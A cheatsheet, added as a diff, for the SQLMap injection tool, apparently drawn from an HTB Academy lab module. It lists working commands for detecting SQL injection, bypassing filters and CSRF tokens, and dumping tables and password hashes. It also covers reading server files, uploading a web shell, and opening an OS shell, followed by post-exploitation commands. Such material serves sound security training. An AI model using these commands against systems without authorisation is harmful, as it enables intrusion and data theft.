@@ -1,0 +1,276 @@
+SQLMap Cheatsheet
+Built from the HTB Academy SQLMap Essentials module walkthrough.
+Organized by the question "what's the situation?" not by flag.
+---
+1. Setup & Detection
+Basic injection points
+Situation	Command
+GET param	`sqlmap -u "http://host/page.php?id=1" --batch`
+POST param (saved from Burp)	`sqlmap -r req.txt -p id --batch`
+Cookie param	`sqlmap -r req.txt -p id --batch --level=2`
+JSON body	Edit body to `{"id":1*}`, then `sqlmap -r req.txt --batch`
+Specific injection spot	Use `*` marker in request file at the exact byte
+Multiple params, only test one	`-p <name>`
+Skip a param (e.g. nonce)	`--skip="uid"`
+Capture a Burp request to a file
+In Burp: right-click request → Copy to file → save as `req.txt`.
+Always leave a blank line between headers and body. HTTP requires it.
+Level and Risk (what they actually do)
+`--level=1` (default): GET/POST params only
+`--level=2`: adds cookies
+`--level=3`: adds User-Agent / Referer
+`--level=5`: throws every boundary SQLMap knows
+`--risk=1` (default): AND-based payloads only
+`--risk=2`: adds heavy time-based
+`--risk=3`: adds OR-based payloads (can be destructive on UPDATE/DELETE — opt-in)
+Bump both when "not injectable" feels wrong: `--level=5 --risk=3`
+---
+2. Techniques
+`--technique=BEUSTQ` — pick which to use.
+Letter	Type	Speed	Notes
+U	UNION	Fastest	Whole table per request when stars align
+E	Error-based	Fast	~200-byte chunks per request
+S	Stacked queries	Varies	Needed for OS commands, INSERT/UPDATE/DELETE
+B	Boolean blind	Slow	~7 requests per character
+T	Time-based blind	Slowest	SLEEP delay × characters
+Q	Inline queries	Rare	`SELECT (SELECT @@version) FROM ...`
+Speed flags to combine for slow techniques:
+```bash
+--time-sec=2          # Lower SLEEP delay (default 5)
+--predict-output      # Statistical guessing for common chars
+```
+---
+3. Enumeration (after detection succeeds)
+Run in this order. Session cache makes follow-ups fast.
+```bash
+# List databases
+sqlmap -u "..." --batch --technique=UE --dbs
+
+# List tables in a DB
+sqlmap -u "..." --batch --technique=UE -D testdb --tables
+
+# List columns in a table
+sqlmap -u "..." --batch --technique=UE -D testdb -T users --columns
+
+# Dump a whole table
+sqlmap -u "..." --batch --technique=UE -D testdb -T users --dump
+
+# Dump specific columns
+sqlmap -u "..." --batch --technique=UE -D testdb -T users -C name,password --dump
+
+# Dump only matching rows (cleaner, faster)
+sqlmap -u "..." --batch --technique=UE -D testdb -T users --dump --where="name LIKE '%Kimberly%'"
+
+# Dump everything in a DB
+sqlmap -u "..." --batch --technique=UE -D testdb --dump
+
+# Find tables/columns by name across all DBs
+sqlmap -u "..." --batch --technique=UE --search -T flag
+sqlmap -u "..." --batch --technique=UE --search -C password
+sqlmap -u "..." --batch --technique=UE --search -D admin
+```
+---
+4. Bypasses & Adjustments (when defaults fail)
+OR-based SQLi (`OR` in the back-end query)
+`--risk=3` is required. Default risk=1 only tests AND payloads.
+```bash
+sqlmap -u "..." --batch --risk=3
+```
+Anti-CSRF token or rotating nonce
+`--csrf-token` = parameter name. `--csrf-url` = page that issues fresh tokens.
+```bash
+sqlmap -r req.txt --batch \
+  --csrf-token="t0ken" \
+  --csrf-url="http://host/page.php"
+```
+Use the same flags for any "unique id" / nonce parameter that rotates per request.
+Non-standard boundary (backticks, weird quoting)
+```bash
+# Let SQLMap find it
+sqlmap -u "..." --batch --level=5 --risk=3
+
+# Or specify it directly (much faster on subsequent runs)
+sqlmap -u "..." --batch \
+  --prefix="\`=\`id\`" --suffix="AND \`id\`=\`id"
+```
+UNION column count off (>20 or types mismatch)
+```bash
+# Wider range
+sqlmap -u "..." --batch --union-cols=10-50
+
+# Different filler (when NULL is rejected)
+sqlmap -u "..." --batch --union-char=1
+
+# Force UNION specifically
+sqlmap -u "..." --batch --technique=U --union-cols=1-30
+```
+Error-suppressing app (response looks the same for valid/invalid)
+```bash
+# Strip HTML, compare text-only
+sqlmap -u "..." --batch --text-only
+
+# Force UNION with wider column hunt
+sqlmap -u "..." --batch --technique=U --union-cols=1-30 --union-char=1 --text-only
+```
+OR-injection cookie issues
+If OR-based detection works but data retrieval breaks:
+```bash
+--drop-set-cookie
+```
+---
+5. Tamper Scripts (filter bypasses)
+List all: `sqlmap --list-tampers`
+Top tampers to know:
+Tamper	What it does	Use when
+`between`	`>` → `NOT BETWEEN`, `=` → `BETWEEN x AND x`	`<` or `>` filtered
+`space2comment`	spaces → `/**/`	spaces blocked
+`space2plus`	spaces → `+`	spaces blocked, comment also blocked
+`space2hash`	spaces → `%23` then random text	aggressive space filter
+`randomcase`	randomize keyword casing	naive keyword filter
+`charencode`	URL-encode payload chars	basic char blacklist
+`apostrophenullencode`	`'` → `%00%27`	quotes filtered
+`equaltolike`	`=` → `LIKE`	`=` filtered
+Chain them with commas:
+```bash
+sqlmap -r req.txt --batch --tamper=between,space2comment,randomcase
+```
+When SQLMap says "tamper script changes are not shown in payloads," trust it — the wire traffic is being rewritten even if the summary output looks unchanged.
+---
+6. File Access & RCE (after SQLi confirmed)
+Requires MySQL `FILE` privilege. Check first:
+```bash
+sqlmap -u "..." --batch --privileges --current-user
+```
+Read a file
+```bash
+sqlmap -u "..." --batch --file-read="/var/www/html/flag.txt"
+```
+Output lands at `~/.local/share/sqlmap/output/<host>/files/`.
+If extraction is garbled:
+`--hex` → force HEX() encoding (binary files)
+`--no-cast` → skip CAST() if it's filtered
+Write a file
+```bash
+sqlmap -u "..." --batch \
+  --file-write="local_shell.php" \
+  --file-dest="/var/www/html/shell.php"
+```
+Interactive OS shell
+```bash
+sqlmap -u "..." --batch --os-shell
+```
+Then at the `os-shell>` prompt:
+```
+id
+whoami
+hostname
+find / -name "flag*" -type f 2>/dev/null
+ls -la /root /home /tmp
+cat /etc/passwd
+cat /proc/1/environ          # Docker env vars
+env
+```
+One-off OS command
+```bash
+sqlmap -u "..." --batch --os-cmd="id"
+```
+Cleanup (real engagements, OSCP report)
+```
+os-shell> rm /var/www/html/tmp*.php
+```
+---
+7. Performance & Quality of Life
+Flag	Effect
+`--batch`	Auto-answer all prompts with defaults
+`--threads=10`	Parallel requests (capped at 1 for time-based)
+`--time-sec=2`	Lower SLEEP delay for time-based
+`--predict-output`	Statistical guessing on common chars
+`--random-agent`	Random User-Agent header
+`--proxy=http://127.0.0.1:8080`	Route through Burp for inspection
+`--flush-session`	Clear cached session (re-detect from scratch)
+`--fresh-queries`	Re-run extraction even if cached
+`--current-user`	Show DB user
+`--current-db`	Show current database
+`--hostname`	Show server hostname
+`--is-dba`	Check if current user is DBA
+`--passwords`	Dump password hashes for all DB users
+---
+8. The Diagnosis Playbook
+When SQLMap says "not injectable":
+Heuristic positive but no technique? → Drop `--technique` restriction, try defaults
+Param dynamic but heuristic negative? → Likely error suppression. Force UNION: `--technique=U --union-cols=1-30 --text-only`
+`>` or `<` filtered? → `--tamper=between`
+Keywords filtered (UNION, SELECT)? → `--tamper=randomcase,charencode`
+Spaces filtered? → `--tamper=space2comment`
+CSRF token / rotating nonce? → `--csrf-token=<name> --csrf-url=<page>`
+Two params, one is a unique ID? → `-p target --skip=nonce` OR treat nonce as csrf-token
+Detection only finds boolean/time-based? → Look for OR-based; add `--risk=3`
+Non-standard quoting in back-end query? → `--level=5 --risk=3` (or specify `--prefix`/`--suffix` once known)
+All else fails? → Probe manually in Burp Repeater. Try `'`, `"`, ```, `)`, `--`, `#` and watch response changes. The boundary will reveal itself.
+---
+9. Burp Recon Cheats (before SQLMap)
+For UNION column count via ORDER BY (URL-encode spaces as `+`):
+```
+?id=1+ORDER+BY+1--+-     # baseline
+?id=1+ORDER+BY+5--+-     # try 5
+?id=1+ORDER+BY+99999--+- # impossible — if 200, errors are swallowed
+```
+For visible UNION columns:
+```
+?id=-1+UNION+SELECT+1,2,3,4,5,6--+-
+```
+(Numbers that appear in the response = visible column positions for exfil.)
+Use Burp Intruder for column-count hunting — payload type Numbers, sort by Response Length to spot the boundary.
+---
+10. Output Location
+```
+~/.local/share/sqlmap/output/<host>/
+├── log                    # detection log
+├── session.sqlite         # cached injection points + dumped data
+├── target.txt
+├── dump/
+│   └── <database>/
+│       └── <table>.csv    # dumped table contents
+└── files/
+    └── _path_to_file.ext  # files read via --file-read
+```
+Tab-complete your way around. `session.sqlite` is queryable with `sqlite3` if you ever want to extract data SQLMap captured.
+---
+11. Tested-and-Works Quick Recipes
+```bash
+# Vanilla GET
+sqlmap -u "http://host/page.php?id=1" --batch --technique=UE --dump -T flag
+
+# Vanilla POST
+sqlmap -r req.txt -p id --batch --technique=UE --dump -T flag
+
+# Cookie injection
+sqlmap -r req.txt -p id --batch --level=2 --technique=UE --dump -T flag
+
+# JSON body (with * marker added to body)
+sqlmap -r req.txt --batch --technique=UE --dump -T flag
+
+# OR-based
+sqlmap -u "http://host/page.php?id=1" --batch --risk=3 --technique=B --dump -T flag
+
+# Non-standard boundary (after one --level=5 --risk=3 detection run)
+sqlmap -u "..." --batch --prefix="\`=\`id\`" --suffix="AND \`id\`=\`id" --technique=T --dump
+
+# UNION-only with adjustments
+sqlmap -u "..." --batch --technique=U --union-cols=1-30 --dump -T flag
+
+# CSRF / nonce
+sqlmap -r req.txt -p id --batch --csrf-token="t0ken" --csrf-url="http://host/page.php" --dump -T flag
+
+# `<`/`>` filter
+sqlmap -u "..." --batch --tamper=between --dump -T flag
+
+# File read
+sqlmap -u "..." --batch --file-read="/var/www/html/flag.txt"
+
+# OS shell
+sqlmap -u "..." --batch --os-shell
+
+# Cross-DB table search (when you don't know the database)
+sqlmap -r req.txt --batch --search -T final_flag
+```
